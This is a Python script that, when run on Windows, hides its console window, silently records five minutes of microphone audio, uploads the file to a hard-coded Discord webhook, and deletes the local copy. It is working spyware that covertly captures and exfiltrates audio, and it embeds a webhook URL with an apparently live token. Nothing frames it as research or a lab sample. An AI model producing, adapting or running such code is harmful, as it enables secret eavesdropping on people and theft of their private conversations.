import subprocess
import sys
import sounddevice as sd
import wave
import os
import tempfile
import numpy as np
import requests
import time
import ctypes
from ctypes import wintypes

# Function to install a package using pip
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install the requests package if not already installed
try:
    import requests
except ImportError:
    print("requests package not found. Installing...")
    install("requests")
    import requests

# Hide the console window
def hide_console():
    # Get the console window handle
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 = SW_HIDE to hide the window

# Call the function to hide the console window
hide_console()

# Set parameters for the recording
duration = 5 * 60  # 5 minutes total duration
sample_rate = 44100  # Hz
channels = 1  # Mono

# Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1279782310341775463/tUSoz4kMon0fVjx62uPcoeMnqhsyW3G1ISog6C_rmxfkZSKPCxJWJcJVmhuarVV4bArg"

print("Starting recording process...")

# Get the temp directory path
try:
    temp_dir = tempfile.gettempdir()
    output_filename = "mic_recording.wav"
    output_filepath = os.path.join(temp_dir, output_filename)
    print(f"File will be saved to: {output_filepath}")
except Exception as e:
    print(f"Error setting up file paths: {e}")
    sys.exit(1)

# Record the entire duration in one go
try:
    print(f"Recording for {duration} seconds...")
    recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=channels, dtype='int16')
    print("Recording started...")
    sd.wait()  # Wait until recording is finished
    print("Recording complete.")
except Exception as e:
    print(f"Error during recording: {e}")
    sys.exit(1)

# Save the recording to a file
try:
    with wave.open(output_filepath, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(2)  # 2 bytes = 16 bits
        wf.setframerate(sample_rate)
        wf.writeframes(recording.tobytes())
    print(f"Recording saved to {output_filepath}")
except Exception as e:
    print(f"Error saving recording: {e}")
    sys.exit(1)

# Send the recording to the Discord webhook
try:
    with open(output_filepath, 'rb') as f:
        files = {
            'file': (output_filename, f)
        }
        response = requests.post(webhook_url, files=files)
        if response.status_code == 204:
            print("File sent successfully to Discord webhook.")
        else:
            print(f"Failed to send file to Discord. Status code: {response.status_code}")
except Exception as e:
    print(f"Error sending file to Discord: {e}")
    sys.exit(1)

# Delete the recording file
try:
    os.remove(output_filepath)
    print(f"Deleted file: {output_filepath}")
except OSError as e:
    print(f"Error deleting file: {e}")

print("Process completed.")
